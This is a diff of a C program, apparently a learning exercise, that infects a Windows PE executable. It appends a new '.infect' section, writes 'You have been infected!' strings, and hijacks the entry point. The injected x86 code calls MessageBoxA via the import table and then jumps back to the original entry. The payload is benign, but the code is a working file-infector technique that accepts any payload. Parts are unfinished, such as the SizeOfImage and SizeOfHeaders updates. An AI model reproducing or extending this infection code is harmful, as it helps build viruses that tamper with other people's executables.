@@ -42,6 +42,8 @@ int main(int argc, char *argv[]) {
 	// TO-DO: Change entry point
 	imageOptionalHeader.AddressOfEntryPoint =
 		getval(fr, dd, SEEK_SET, ioh_offset+16);
+	// Keep a copy
+	const DWORD old_entry = imageOptionalHeader.AddressOfEntryPoint;
 	if (imageOptionalHeader.Magic == 0x10B)
 		imageOptionalHeader.ImageBase =
 		   getval(fr,dd, SEEK_SET, ioh_offset+28);
@@ -104,11 +106,15 @@ int main(int argc, char *argv[]) {
 	}
 
 	IMAGE_IMPORT_DESCRIPTOR user32dll_iid;
-	int user32dll_exist, function_exist = 0;
+	DWORD msgbox_iat_rva; // RVA of MessageBoxA in IAT
+
 	// Search for user32.dll
 	for (int i = 0; ; ++i) {
 		DWORD name_rva = getval(fr, dd, SEEK_SET,import_offset + 20 * i + 12);
-		if (name_rva == 0) break; // No user32.dll
+		if (name_rva == 0) {
+			break;
+			// No user32.dll
+		}
 		BYTE name[MAX_PATH];
 
 		// Read name of import, byte by byte
@@ -119,8 +125,6 @@ int main(int argc, char *argv[]) {
 		}
 
 		if (strcmp(name,"user32.dll")==0) {
-			user32dll_exist = 1;
-
 			user32dll_iid.OriginalFirstThunk = getval(fr, dd, SEEK_SET, import_offset + 20 * i);
 			user32dll_iid.TimeDateStamp = getval(fr, dd, SEEK_CUR, 0);
 			user32dll_iid.ForwarderChain = getval(fr, dd, SEEK_CUR, 0);
@@ -130,33 +134,26 @@ int main(int argc, char *argv[]) {
 			// Ignore functions imported using ordinals
 			IMAGE_THUNK_DATA thunk;
 			for (int j = 0 ;; j++) {
-				thunk.u1.AddressOfData =
-					getval(fr, imageOptionalHeader.Magic == 0x10B ? dd : dq, SEEK_SET,
-				   user32dll_iid.OriginalFirstThunk - iat_section_rva + iat_offset +
-				   (imageOptionalHeader.Magic == 0x10B ? 4 : 8) * j);
+				msgbox_iat_rva = user32dll_iid.OriginalFirstThunk +
+				   (imageOptionalHeader.Magic == 0x10B ? 4 : 8) * j;
+				// Retrieve RVA of function name to scan
+				thunk.u1.AddressOfData = getval(fr,imageOptionalHeader.Magic == 0x10B ? dd : dq,
+					SEEK_SET,msgbox_iat_rva - iat_section_rva + iat_offset);
 				if (thunk.u1.AddressOfData == 0) break; // No MessageBoxA
 
 				BYTE function[MAX_PATH];
 				// Not accounting for Hint/Names table being in a different section
+				// Doesn't seem to be an option since it's not part of Data Directory?
 				fseek(fr, user32dll_iid.Name - import_section_rva + import_offset, SEEK_SET);
 				// Read function name, byte by byte
 				for (int k = 0; k < MAX_PATH; k++) {
 					fread(function+k, 1, 1, fr);
 					if (function[k] == 0) break;
 				}
-				if (strcmp(function,"MessageBoxA")==0) {
-					function_exist = 1;
-				}
-
+				if (strcmp(function,"MessageBoxA")==0) break;
 			}
 			break;
 		}
-	}
-
-	if (user32dll_exist == 0) {
-
-	} else if (function_exist ==0) {
-
 	}
 
 	lastish.VirtualAddress =
@@ -168,13 +165,13 @@ int main(int argc, char *argv[]) {
 		// Name
 		".infect",
 		// Misc.VirtualSize
-		0, // Edit to reflect actual size
+		0, // Edited below to reflect actual size
 		// VirtualAddress
 		closest(lastish.VirtualAddress + lastish.SizeOfRawData, imageOptionalHeader.SectionAlignment),
 		// SizeOfRawData
-		closest(newish.Misc.VirtualSize,imageOptionalHeader.FileAlignment),
+		0, // Edited below
 		// PointerToRawData
-		0, // Edit
+		0, // Edited ~18 lines below (~ line 192)
 		// PointerToRelocations
 		0,
 		// PointerToLinenumbers
@@ -191,30 +188,38 @@ int main(int argc, char *argv[]) {
 
 	// Adding new section
 	fseek(fr, 0, SEEK_END);
-	const long old_end = ftell(fr);
+	const DWORD old_end = ftell(fr);
 	newish.PointerToRawData = closest(old_end+1,imageOptionalHeader.SectionAlignment);
 	const char *msgCaption = "Notice";
 	const char *msgText = "You have been infected!";
 
 	pad(fa, newish.PointerToRawData - old_end);
-	// Should be written at newsh_addr
+	// Written at newish.PointerToRawData
 	fwrite(msgCaption, strlen(msgCaption)+1, 1, fa);
-	// Should be written at newsh_addr + strlen(msgCaption) + 1
+	// Written at newish.PointerToRawData + strlen(msgCaption) + 1
 	fwrite(msgText, strlen(msgText)+1, 1, fa);
+
+	// Insert new address of entry point
+	imageOptionalHeader.AddressOfEntryPoint = ftell(fa);
+	setval_int(fr,imageOptionalHeader.AddressOfEntryPoint, dd, SEEK_SET, ioh_offset + 16);
+
+	// push 1030h (Type)
 	instruct(fa, 0x68, 0x1030);
+	// push msgCaption
 	instruct(fa, 0x68, imageOptionalHeader.ImageBase+newish.PointerToRawData);
+	// push msgText
 	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newish.PointerToRawData + strlen(msgCaption) + 1);
+	// push 0 (hWnd)
 	instruct(fa, 0x6a, 0);
-	instruct(fa, 0xFF25, imageOptionalHeader.ImageBase + 0);
-	// ImageBase + IAT RVA of MessageBoxA
+	// call MessageBoxA
+	instruct(fa, 0xFF15, imageOptionalHeader.ImageBase + msgbox_iat_rva);
 
-	// Call MessageBoxA
+	// jmp back to old AddressOfEntryPoint
+	instruct(fa, 0xFF25, imageOptionalHeader.ImageBase + old_entry);
 
-	// Jmp back to old AddressOfEntryPoint
-
-	// // Edit SizeOfImage
-	// imageOptionalHeader.SizeOfImage =
-	// 	closest(imageOptionalHeader.SizeOfImage + newish.SizeOfRawData, ;
+	newish.Misc.VirtualSize = ftell(fa) - newish.PointerToRawData;
+	newish.SizeOfRawData = closest(newish.Misc.VirtualSize,imageOptionalHeader.FileAlignment);
+	pad(fa, newish.SizeOfRawData - newish.Misc.VirtualSize);
 
 	// Write to Section Header
 	setval_char(fr, newish.Name,8, SEEK_SET, newish_offset);
@@ -228,7 +233,11 @@ int main(int argc, char *argv[]) {
 	setval_int(fr, newish.NumberOfLinenumbers, dw, SEEK_CUR, 0);
 	setval_int(fr, newish.Characteristics, dd, SEEK_CUR, 0);
 
+	// // Edit SizeOfImage
+	// imageOptionalHeader.SizeOfImage =
+	// 		closest(imageOptionalHeader.SizeOfImage + newish.SizeOfRawData,imageOptionalHeader
 
+	// Edit SizeOfHeaders
 
 	end(f, 0);
 }
